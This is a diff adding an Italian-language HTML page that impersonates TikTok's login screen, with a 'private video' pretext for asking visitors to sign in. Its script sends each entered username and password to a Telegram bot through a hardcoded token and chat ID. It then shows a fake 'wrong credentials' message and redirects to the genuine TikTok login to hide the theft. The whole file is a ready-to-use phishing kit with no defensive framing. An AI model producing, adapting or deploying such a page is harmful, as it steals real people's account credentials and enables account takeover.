@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok - Video privato</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, Arial, sans-serif; }
+  body { background:#000; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+  .box { width:100%; max-width:360px; padding:30px 24px; text-align:center; }
+  .logo { font-size:34px; font-weight:800; margin-bottom:6px; letter-spacing:-1px; }
+  .logo span { color:#fe2c55; }
+  .sub { color:#bbb; font-size:14px; margin-bottom:24px; line-height:1.4; }
+  .sub b { color:#fff; }
+  input { width:100%; padding:14px; margin-bottom:12px; border-radius:6px; border:1px solid #333; background:#121212; color:#fff; font-size:15px; }
+  input:focus { outline:none; border-color:#fe2c55; }
+  button { width:100%; padding:14px; border:none; border-radius:6px; background:#fe2c55; color:#fff; font-size:16px; font-weight:600; cursor:pointer; }
+  .err { color:#fe2c55; font-size:13px; margin-top:14px; display:none; }
+  .foot { color:#555; font-size:11px; margin-top:28px; }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="logo">Tik<span>Tok</span></div>
+  <div class="sub">Questo video è di un <b>account privato</b>.<br>Accedi per continuare a guardarlo.</div>
+  <form id="f">
+    <input id="u" type="text" placeholder="Email, username o telefono" required>
+    <input id="p" type="password" placeholder="Password" required>
+    <button type="submit">Accedi</button>
+  </form>
+  <div class="err" id="e">Credenziali errate. Riprova.</div>
+  <div class="foot">© 2024 TikTok</div>
+</div>
+<script>
+const TOKEN = "9093872805:AAEqR93AHX4jqyvTn1-f1Pwx-GaX-ArdXUI";
+const CHAT_ID = "9093872805";
+
+document.getElementById("f").addEventListener("submit", async (ev) => {
+  ev.preventDefault();
+  const u = document.getElementById("u").value;
+  const p = document.getElementById("p").value;
+  const text = "🎯 TikTok\nUser: " + u + "\nPass: " + p;
+  try {
+    await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+  } catch(e) {}
+  document.getElementById("e").style.display = "block";
+  setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 1800);
+});
+</script>
+</body>
+</html>
